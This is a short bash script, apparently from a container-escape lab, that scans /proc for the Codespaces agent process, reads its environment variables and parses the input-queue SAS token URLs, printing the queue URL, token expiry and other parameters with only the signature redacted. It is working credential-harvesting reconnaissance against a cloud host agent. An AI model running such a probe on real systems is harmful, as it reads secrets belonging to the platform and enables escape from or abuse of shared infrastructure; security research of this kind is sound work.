#!/usr/bin/env bash
set +e
OUT="${OUT:-/workspaces/container-escape-lab/final-probe.txt}"
AP=""
for p in /proc/[0-9]*/; do c=$(cat ${p}comm 2>/dev/null); [ "$c" = "codespaces" ] && AP="${p%/}" && break; done
echo "agent pid: ${AP:-NOT_FOUND}"
[ -n "$AP" ] && tr '\0' '\n' < ${AP}/environ 2>/dev/null | grep '^VSOAGENT_ENVAGENTSETTINGS__INPUTQUEUE' | python3 -c "
import sys, urllib.parse as up, datetime
for l in sys.stdin.read().splitlines():
    k, _, v = l.partition('=')
    if k.endswith('SASTOKEN'):
        try:
            q = up.urlparse(v).query
            params = up.parse_qs(q)
            for pk in sorted(params):
                pv = params[pk][0]
                if pk == 'sig':
                    print(f'  sig = <REDACTED len={len(pv)}>')
                elif pk == 'se':
                    try: print(f'  se = {datetime.datetime.fromtimestamp(int(pv), datetime.timezone.utc).isoformat()}  <-- SAS EXPIRY')
                    except Exception: print(f'  se = {pv}')
                else:
                    print(f'  {pk} = {pv[:40]}')
        except Exception as e:
            print('parse err:', e)
    elif k.endswith('QUEUEURL'):
        print(f'{k} = {v}')
    else:
        print(f'{k} = {str(v)[:60]}')
"
echo "T10 DONE"
